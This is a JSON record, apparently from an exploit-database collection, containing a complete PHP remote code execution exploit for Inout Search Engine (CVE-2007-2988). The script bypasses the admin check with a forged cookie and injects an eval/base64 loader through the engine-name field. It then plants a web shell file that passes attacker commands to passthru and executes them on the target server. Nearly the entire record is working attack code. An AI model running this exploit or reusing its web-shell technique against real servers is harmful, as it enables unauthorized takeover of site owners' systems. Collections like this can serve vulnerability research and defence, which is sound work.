{
  "id": "4004",
  "title": "Inout Search Engine - Remote Code Execution",
  "cve": "CVE-2007-2988",
  "vuln_type": "rce",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"\r\nInout Search Engine (all version) Remote Code Execution Exploit\r\nby BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>\r\nThanks to rgod for the php code and Marty for the Love\r\n\r\n\";\r\nif ($argc<3) {\r\necho \"Usage: php \".$argv[0].\" Host Path cmd\r\nHost:          target server (ip/hostname)\r\nPath:          path of inoutsearchengine\r\ncmd:           a Shell command\r\n\r\nExample:\r\nphp \".$argv[0].\" localhost /inoutsearchengine/ dir\";\r\n\r\ndie;\r\n}\r\n/*\r\nVuln Explanation:\r\n\r\nTake a look on one of the admin files, the begin should be something like this:\r\n\r\n<?php\r\ninclude(\"config.inc.php\");\r\nif(!isset($_COOKIE['admin']))\r\n{\r\nheader(\"Location:index.php\");\r\n}\r\n?>\r\n\r\nthis is not a protection for two reasons:\r\n\r\ni) everyone can make a cookie with false credentials\r\nii) there isn't any exit or die function after header('Location: index.php')\r\n\r\nNow look at create engine.php, and you find that there isn't any parse of the\r\ntext you send as the engine name..\r\n\r\nBesides that the names of the tabs are written into a PHP files to make faster\r\nthe loading process.. the only limit we have while we inject the code is taht we\r\ncan't put spaces in the code, otherwise php will end with an error..\r\n\r\n*/\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$cmd=\"\";\r\nfor ($i=3; $i<=$argc-1; $i++){\r\n$cmd.=\" \".$argv[$i];\r\n}\r\n$cmd=urlencode($cmd);\r\n\r\n\r\n$port=80;\r\n$proxy=\"\";\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n\r\necho \"- Injecting Shell Creator..\\r\\n\";\r\n/*\r\nIt was too simple to inject directly the shell into the file..\r\nLet's make the process longer :P\r\n\r\n*/\r\n$data=\"term=<?eval(base64_decode(\\$_POST[shell]));?>&Submit=Create+New+Engine+%21+&spl=term\";\r\n$packet=\"POST \".$p.\"admin/create_engine.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"admin/create_engine.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\necho \"- refreshing data file..\\r\\n\";\r\n$packet=\"GET \".$p.\"admin/generate_tabs.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\necho \"- Creating the real Shell..\\r\\n\";\r\n/*\r\nCostumize it as you want..\r\n*/\r\n$my_shell = base64_encode('$fp=fopen(\\'piggy_marty.php\\',\\'w\\');\r\nfputs($fp,\\'<?php error_reporting(0);\r\nset_time_limit(0);\r\nif (get_magic_quotes_gpc()) {\r\n$_GET[cmd]=stripslashes($_GET[cmd]);\r\n}\r\necho 666999;\r\npassthru($_GET[cmd]);\r\necho 666999;\r\n?>\\');\r\nfclose($fp);\r\nchmod(\\'piggy_marty.php\\',777);');\r\n$data=\"shell=$my_shell\";\r\n$packet=\"POST \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"index.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\necho \"StepX - Executing Shell..\\r\\n\";\r\n$packet=\"GET \".$p.\"piggy_marty.php?cmd=$cmd HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: cmd=$cmd\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (strstr($html,\"666999\"))\r\n{\r\n  echo \"Exploit succeeded...\\r\\n\";\r\n  $temp=explode(\"666999\",$html);\r\n  die(\"\\r\\n\".$temp[1].\"\\r\\n\");\r\n}\r\n\r\n# Coded With BH Fast Generator v0.1\r\n?>\r\n\r\n# milw0rm.com [2007-05-29]",
  "url": "https://www.exploit-db.com/exploits/4004"
}